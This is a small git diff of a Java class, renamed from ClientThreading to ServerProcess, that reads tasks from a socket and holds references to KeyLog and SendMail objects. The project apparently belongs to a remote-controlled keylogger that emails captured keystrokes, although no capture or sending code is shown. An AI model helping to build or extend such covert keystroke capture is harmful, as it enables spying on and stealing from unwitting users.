@@ -7,7 +7,7 @@ import java.net.Socket;
 import java.util.ArrayList;
 import java.util.List;
 
-public class ClientThreading extends Thread {
+public class ServerProcess extends Thread {
 
   Socket socket;
   BufferedReader reader;
@@ -15,7 +15,7 @@ public class ClientThreading extends Thread {
   KeyLog keylog;
   SendMail send ;
 
-  public ClientThreading(Socket socket, KeyLog keylog , SendMail send)  {
+  public ServerProcess(Socket socket, KeyLog keylog , SendMail send)  {
     this.socket = socket;
     this.keylog = keylog;
     this.send = send;
@@ -35,7 +35,7 @@ public class ClientThreading extends Thread {
       System.out.println(reader.readLine());
       List<String> task = new ArrayList<>();
       while (!(line = this.reader.readLine()).equals("end")) {
-        task.add(line);
+        task.add(0, line);
       }
       
       if (!task.isEmpty()) {
